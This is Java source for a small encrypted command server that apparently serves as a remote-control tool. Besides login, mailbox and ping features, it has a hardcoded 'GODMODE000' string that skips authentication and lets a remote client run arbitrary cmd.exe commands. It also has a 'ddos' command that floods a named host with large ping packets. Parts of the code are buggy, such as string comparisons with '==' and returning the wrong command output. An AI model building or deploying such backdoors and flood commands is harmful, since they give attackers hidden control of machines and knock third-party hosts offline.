import java.awt.List;
import java.io.*;
import java.net.*;
import java.util.*;
import javax.swing.*;
import java.nio.file.*;
import javax.net.*;
import javax.net.ssl.*;
import java.text.SimpleDateFormat;
import java.util.Date;
public class main {
 public static final String ANSI_RESET = "\u001B[0m";
 public static final String ANSI_BLACK = "\u001B[30m";
 public static final String ANSI_RED = "\u001B[31m";
 public static final String ANSI_GREEN = "\u001B[32m";
 public static final String ANSI_YELLOW = "\u001B[33m";
 public static final String ANSI_BLUE = "\u001B[34m";
 public static final String ANSI_PURPLE = "\u001B[35m";
 public static final String ANSI_CYAN = "\u001B[36m";
 public static final String ANSI_WHITE = "\u001B[37m";
 @SuppressWarnings("resource")
 public static void main (String[] args) {
     try {
   String key = args[0];
if (key.equals(null) || key.equals("")) {
System.out.println("Usage: java main [encryption key]");
}else {}
	char[] sm = key.toCharArray();
   System.out.println("Using Key:"+key);
   String response = null;
   System.out.println("Reading Database..." + ANSI_GREEN + "DONE !" + ANSI_RESET);
   ServerSocket serverSocket = new ServerSocket(2468);
   System.out.println("Starting Server..." + ANSI_GREEN + "DONE !" + ANSI_RESET);
   Socket s = serverSocket.accept();
   DataInputStream dis = new DataInputStream(s.getInputStream());
   DataOutputStream outToClient = new DataOutputStream(s.getOutputStream());
   String data = new String(Files.readAllBytes(Paths.get("user.txt")));
   String[] p = data.split(":");
   String admin = new String(Files.readAllBytes(Paths.get("admin.txt")));
   String[] admindb = admin.split(":");
   String adminn = admindb[0];
   HashMap < String, String > adminhm = new HashMap < String, String > ();
   adminhm.put(admindb[0], admindb[1]);
   HashMap < String, String > hm = new HashMap < String, String > ();
   String userm = null;
   boolean adminlog = false;
   int o = 2;
   String line = "";
   for (int i = 1; i < p.length; i += 2) {
    hm.put(p[i - 1], p[o - 1]);
    o += 2;
   }
   String keyp = null, keyu = null;
   //Listen for commands
   System.out.println("Ready?..." + ANSI_GREEN + "DONE !" + ANSI_RESET);
   String state = "";
   while (true) {
    //Read user input
   String clientSentence = dis.readUTF();
	clientSentence = AES.decrypt(clientSentence,key);
  String user = null, pass = null, token = null, login = null;
    //Auth SECTION :START
    if (clientSentence.contains("127.0.0") && login == "true") {
	      response = "SCP firewall has blocked the request";
      String dc = AES.encrypt(response,key);
     outToClient.writeUTF(dc);
    }
    if (clientSentence.contains("user")) {
     keyu = clientSentence.substring(5);
     keyp = hm.get(keyu);
     if (keyp != null) {
      response = "USER OK";
      String dc = AES.encrypt(response,key);
      String usermail = keyu;
      outToClient.writeUTF(dc);
      user = "usertrue";
     } else {
      response = "USER IS EMPTY";
      String dc = AES.encrypt(response,key);
      outToClient.writeUTF(dc);
	}
    }
    if (clientSentence.contains("pass")) {
     String kk = clientSentence.substring(5);
     if (kk.equals(keyp)) {
	      response = "PASS OK !,Welcome "+keyu;
      String dc = AES.encrypt(response,key);
      outToClient.writeUTF(dc);
      pass = "passtrue";
      state = "true";
     } else {
      response = "PASSWORD IS WRONG";
      String dc = AES.encrypt(response,key);
      outToClient.writeUTF(dc);
	}
    }
    // :END
    // Traffic Recieved Notify
    System.out.println("Recieved Traffic Successfully from:" + (s.getInetAddress()) + ":" + (s.getPort()));
    //GOD MODE entrance
    if (clientSentence.contains("GODMODE000") && token == null) {
	      response = "GOD Mode Activated !";
      String dc = AES.encrypt(response,key);
     outToClient.writeUTF(dc);
     token = "true";
    }
    //GOD MODE EXECUTE ANYTHING
    if (state.equals("true") && clientSentence.equals("mail")) {
    	//MAILBOX
    	String dataaa = new String(Files.readAllBytes(Paths.get(keyu+"-mail.txt")));
    	String dc = AES.encrypt(dataaa,key);
    	outToClient.writeUTF(dc);
    }
    if (state.equals("true") && clientSentence.contains("send mail")) {
    	String to = clientSentence.substring(13,clientSentence.indexOf("@"));
    	String message = clientSentence.substring((clientSentence.indexOf("@")+1));
        BufferedWriter ewe = new BufferedWriter(new FileWriter(to+"-mail.txt", true));
        String wew = new String(Files.readAllBytes(Paths.get(to+"-mail.txt")));
        if ((wew.equals(null) || wew.equals("")) == false) {
        	ewe.newLine();
        }else {}
    	SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
    	Date date = new Date();
        ewe.append(to+" -> "+message+" - "+formatter.format(date));
        ewe.close();
	    String dc = AES.encrypt("SENDING DONE !",key);
        outToClient.writeUTF(dc);
    }
    if (state.equals("true") && (clientSentence.equals("create mail") || clientSentence.equals("reset mail"))) {
    	PrintWriter writer = new PrintWriter(keyu+"-mail.txt", "UTF-8");
    	writer.append(null);
    	response = "New Mail box created !";
    	outToClient.writeUTF(AES.encrypt(response,key));
    }
    if (clientSentence.contains("execute") && token == "true") {
     String cmd = clientSentence.substring(8);
     Process process = Runtime.getRuntime().exec("cmd.exe /C "+cmd);
     BufferedReader input =  new BufferedReader(new InputStreamReader(process.getInputStream()));  
     while ((line = input.readLine()) != null) {  
    	 response = input.toString();
    	   String dc = AES.encrypt(response,key);
    	   outToClient.writeUTF(dc);
     }  
     outToClient.writeUTF(AES.encrypt("Execution Done !",key));
     process.destroyForcibly();
     input.close();
    }
    //Admin execute commands
    if (adminhm.containsKey(clientSentence)) {
     userm = clientSentence;
	response = "Admin User OK";
     String dc = AES.encrypt(response,key);
     outToClient.writeUTF(dc);
    } else if (clientSentence.equals(adminhm.get(userm))) {
     adminlog = true;
     response = "Admin Password OK";
	String dc = AES.encrypt(response,key);
     outToClient.writeUTF(dc);
    }
    if (adminlog) {
     login = "true";
    }
    if (clientSentence.equals(null) || clientSentence.equals("")) {
    	outToClient.writeUTF("Packet sent,But no content found !");
    }
    if (clientSentence.contains("ping") && (login == "true" || state.equals("true")) && (((clientSentence.contains("127.0.0"))) != true)) {
     //Ping request -> Syntax (ping [host])
     System.out.println("PING requested\n");
     String ip = clientSentence.substring(5);
     InetAddress inet = InetAddress.getByName(ip);
     if (inet.isReachable(5000)) {
      response = ip + " is reachable";
	String dc = AES.encrypt(response,key);
      outToClient.writeUTF(dc);
     } else {
      response = ip + " is unreachable/invalid";
		String dc = AES.encrypt(response,key);
      outToClient.writeUTF(dc);
     }
    } else if (clientSentence.contains("getip") && (login == "true" || state.equals("true")) && (((clientSentence.contains("127.0.0"))) != true)) {
     //Get ip of host -> Syntax (getip [host])
     String add = clientSentence.substring(6);
     InetAddress inet = InetAddress.getByName(add);
     response = "The ip of:" + (add) + " is:" + (inet);
	String dc = AES.encrypt(response,key);
     outToClient.writeUTF(dc);
    } else if (clientSentence.equals("help")) {
     //Show help MSG
    	String help = new String(Files.readAllBytes(Paths.get("help.txt")));
    	String dc = AES.encrypt(help,key);
     outToClient.writeUTF(dc);
    } else if (clientSentence.contains("ddos") && (login == "true" || state.equals("true"))) {
     //DDoS attacking -> Syntax (ddos [host])
     String ip = clientSentence.substring(5);
     int a = 0;
     if (((ip.contains("127.0.0"))) != true) {
      while (a < 250) {
       response = ("100 Packets Sent");
       Process process = Runtime.getRuntime().exec("cmd.exe /C ping -n 100 -l 65500 " + ip);
       String dc = AES.encrypt(response,key);
       outToClient.writeUTF(dc);
       a++;
      }
     } else {
      outToClient.writeUTF("The SCP firewall has blocked the request \n");
     }
    }
    if (clientSentence.contains("createuser") && login == "true") {
     //Create Users with admin prev -> Syntax (createuser [user]:[pass]:)
     outToClient.writeUTF("DONE !");
     String in = clientSentence.substring(11);
     BufferedWriter writer = new BufferedWriter(new FileWriter("user.txt", true));
     writer.write( in );
     String[] pp = in .split(":");
     hm.put(pp[0], pp[1]);
     writer.close();
    } else {
    outToClient.writeUTF("SCPNULCHAR");
   }
}
}catch (Exception w) {
    w.printStackTrace();
    }
}
public static void re() {
 main(null);
}
}